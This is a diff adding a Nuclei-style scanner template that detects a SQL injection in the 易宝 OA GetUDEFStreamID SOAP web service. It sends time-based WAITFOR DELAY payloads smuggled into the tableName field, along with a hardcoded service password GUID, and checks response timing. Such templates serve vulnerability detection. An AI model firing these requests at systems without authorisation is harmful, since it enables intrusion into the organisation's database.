@@ -1,0 +1,77 @@
+id: poc-yaml-yi-bao-oa-getudefstreamid-sqli
+info:
+  name: "易宝 OA GetUDEFStreamID 接口 SQL 注入漏洞"
+  author: ProjectDiscoveryAI
+  severity: high
+  tags: 易宝OA
+  description: |
+    易宝OA GetUDEFStreamID endpoint is vulnerable to SQL Injection allowing attackers to potentially execute arbitrary SQL commands.
+
+flow: |
+  http(1) && http(2)
+
+http:
+  - id: initial-check
+    method: GET
+    path:
+      - "{{BaseURL}}/"
+    matchers-condition: and
+    matchers:
+      - type: status
+        status:
+          - 200
+      - type: word
+        part: body
+        words:
+          - "欢迎登录易宝OA系统"
+
+  - id: sqli-attempt
+    raw:
+      - |
+        POST /WebService/BasicService.asmx HTTP/1.1
+        Host: {{Hostname}}
+        SOAPAction: http://tempuri.org/GetUDEFStreamID
+        Content-Type: text/xml; charset=utf-8
+        
+        <?xml version="1.0" encoding="utf-8"?>
+        <soap:Envelope xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance" xmlns:xsd="http://www.w3.org/2001/XMLSchema" xmlns:soap="http://schemas.xmlsoap.org/soap/envelope/">
+          <soap:Body>
+            <GetUDEFStreamID xmlns="http://tempuri.org/">
+              <tableName>';WAITFOR DELAY '0:0:5'--</tableName>
+              <webservicePassword>{ac80457b-368d-4062-b2dd-ae4d490e1c4b}</webservicePassword>
+            </GetUDEFStreamID>
+          </soap:Body>
+        </soap:Envelope>
+      - |
+        POST /WebService/BasicService.asmx HTTP/1.1
+        Host: {{Hostname}}
+        SOAPAction: http://tempuri.org/GetUDEFStreamID
+        Content-Type: text/xml; charset=utf-8
+        
+        <?xml version="1.0" encoding="utf-8"?>
+        <soap:Envelope xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance" xmlns:xsd="http://www.w3.org/2001/XMLSchema" xmlns:soap="http://schemas.xmlsoap.org/soap/envelope/">
+          <soap:Body>
+            <GetUDEFStreamID xmlns="http://tempuri.org/">
+              <tableName>';WAITFOR DELAY '0:0:8'--</tableName>
+              <webservicePassword>{ac80457b-368d-4062-b2dd-ae4d490e1c4b}</webservicePassword>
+            </GetUDEFStreamID>
+          </soap:Body>
+        </soap:Envelope>
+    matchers-condition: and
+    matchers:
+      - type: status
+        status:
+          - 200
+      - type: word
+        part: body
+        words:
+          - "<GetUDEFStreamIDResult>"
+      - type: word
+        part: header
+        words:
+          - "text/xml"
+      - type: dsl
+        dsl:
+          - 'duration_1>=5 && duration_1<=6'
+          - 'duration_2 - duration_1 >2'
+        condition: and
